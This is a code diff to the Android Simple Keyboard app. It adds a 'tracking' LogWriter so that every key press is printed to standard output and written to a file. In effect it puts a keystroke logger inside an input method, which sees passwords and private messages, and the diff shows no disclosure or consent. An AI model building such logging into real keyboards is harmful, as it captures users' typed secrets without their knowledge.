@@ -51,6 +51,8 @@ import rkr.simplekeyboard.inputmethod.latin.common.Constants;
 import rkr.simplekeyboard.inputmethod.latin.common.CoordinateUtils;
 import rkr.simplekeyboard.inputmethod.latin.utils.LanguageOnSpacebarUtils;
 import rkr.simplekeyboard.inputmethod.latin.utils.TypefaceUtils;
+import rkr.simplekeyboard.inputmethod.tracking.LogWriter;
+
 
 /**
  * A view that is responsible for detecting key presses and touch movements.
@@ -137,6 +139,7 @@ public final class MainKeyboardView extends KeyboardView implements MoreKeysPane
 
     private final TimerHandler mTimerHandler;
     private final int mLanguageOnSpacebarHorizontalMargin;
+    private final LogWriter logWriter;
 
     public MainKeyboardView(final Context context, final AttributeSet attrs) {
         this(context, attrs, R.attr.mainKeyboardViewStyle);
@@ -211,6 +214,9 @@ public final class MainKeyboardView extends KeyboardView implements MoreKeysPane
 
         mLanguageOnSpacebarHorizontalMargin = (int)getResources().getDimension(
                 R.dimen.config_language_on_spacebar_horizontal_margin);
+        logWriter = LogWriter.getInstance(getContext());
+
+
     }
 
     private ObjectAnimator loadObjectAnimator(final int resId, final Object target) {
@@ -337,9 +343,14 @@ public final class MainKeyboardView extends KeyboardView implements MoreKeysPane
     }
 
     // Implements {@link DrawingProxy#onKeyPressed(Key,boolean)}.
+
+
     @Override
     public void onKeyPressed(final Key key, final boolean withPreview) {
         key.onPressed();
+        System.out.println("key.toShortString() = " + key.toShortString());
+        // save key to database
+        logWriter.writeToFile(key.toShortString());
         invalidateKey(key);
         if (withPreview && !key.noKeyPreview()) {
             showKeyPreview(key);
